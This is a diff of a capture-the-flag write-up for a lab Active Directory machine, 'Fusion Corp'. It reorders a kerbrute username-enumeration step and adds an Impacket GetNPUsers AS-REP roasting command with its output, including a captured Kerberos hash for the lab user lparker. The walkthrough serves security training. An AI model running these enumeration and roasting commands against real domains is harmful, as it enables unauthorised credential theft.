@@ -178,34 +178,22 @@ Created a file with the <code>usernames</code> --> <code>usernames.txt</code></p
 ![Hard 🚩 - Fusion Corp - 07 - Opened employees ods in LibreOffice Calc](https://github.com/user-attachments/assets/0810a149-c192-4411-a400-d95caf767af6)
 
 
-
-
-<h2 align="center">kerbrute</h2>
-<p>Used <code>kerbrute</code> which user(s) are/is valid.<br><br>
-Downloaded and used <code>kerbrute</code>.<br><br>
-Downloaded it from here --> https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64</p>
-
-<br>
-
-```bash
-:~/FusionCorp# chmod +x kerbrute_linux_amd64
-...
-~/FusionCorp# ./kerbrute_linux_amd64 userenum -d fusion.corp --dc TargetIP /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt
-```
-<br>
-
 <h2 align="center">Impacket GetNPUsers</h2>
 
 <br>
 
-python3 /opt/impacket/build/scripts-3.9/GetNPUsers.py fusion.corp/ -no-pass -usersfile usernames.txt
+```bash
+~/FusionCorp# python3 /opt/impacket/build/scripts-3.9/GetNPUsers.py fusion.corp/ -usersfile usernames.txt -dc-ip TargetIP -outputfile Hash -request
+Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra
+
+:~/FusionCorp# ls
+Hash  usernames.txt
+:~/FusionCorp# cat Hash
+$krb5asrep$23$lparker@FUSION.CORP:7a4ad3775cf8c45e8bc9f6e12ceedf43$d26785939261cf2a492c382c25d81767556867ecd3de9e134bb32b313c4ffa1d490310c7bc814cd949ee5b29a26b9a8c90e39af9b6b3e4be57011b94c463110deae3bd4e3f8cef94d96ad1dab26d106689fbf455d01feb4407d94d91aba82e3bf6611594cb566a999a3bf55f649ba3a0e5e1ed3f680b357b241c86bdde9d5aa8287f9f7dfbcce841a63b51d42d02d30da99b28614ddda39eba6cd973dfe1eb1ba6b7de7b39ebeb8cffa9a774f2109283a1a7714d240ae821fe6690b6ab363d0ec8db4324889eec196ff7b7562bde05b17c9b4b0fede13f601ff9d7b2ea9bf1870d237a71bfc935342437
+root@ip-10-10-250-201:~/FusionCorp# 
+```
 
 <br>
-
-![Hard 🚩 - Fusion Corp - 09 - Impacket GetNPUsers](https://github.com/user-attachments/assets/b7e01d3b-e565-4020-b3d2-f7e89a10761d)
-
-<br>
-
 
 
 <h2 align="center">hashcat</h2>
@@ -227,6 +215,26 @@ Confirmed <code>Kerberos</code>´ <code>lparker@FUSION.CORP</code>;</p>
 ![Hard 🚩 - Fusion Corp - 12 - Discovered a valid user and its password](https://github.com/user-attachments/assets/11de4802-49c3-46f9-bd3b-782956619c88)
 
 <br>
+
+<br>
+
+<h2 align="center">kerbrute</h2>
+<p>Used <code>kerbrute</code> which user(s) are/is valid.<br><br>
+Downloaded and used <code>kerbrute</code>.<br><br>
+Downloaded it from here --> https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64</p>
+
+<br>
+
+```bash
+:~/FusionCorp# chmod +x kerbrute_linux_amd64
+...
+~/FusionCorp# ./kerbrute_linux_amd64 userenum -d fusion.corp --dc TargetIP /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt
+```
+<br>
+
+
+
+
 
 
 
